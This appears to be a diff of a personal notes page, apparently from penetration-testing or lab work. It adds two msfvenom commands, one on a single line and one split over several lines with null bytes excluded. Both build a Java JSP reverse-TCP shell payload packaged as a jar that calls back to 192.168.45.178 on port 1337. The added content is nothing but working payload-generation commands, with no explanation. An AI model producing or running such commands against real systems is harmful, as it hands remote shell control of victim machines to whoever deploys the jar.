@@ -1,11 +1,16 @@
 [[Editing Copy Page]]
 
 ```
-
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.178 LPORT=1337 -f jar > shell.jar
 ```
 
 ```
-
+msfvenom \
+  -p java/jsp_shell_reverse_tcp \
+  LHOST=192.168.45.178 \
+  LPORT=1337 \
+  -b '\x00' \
+  -f jar
 ```
 
 ```
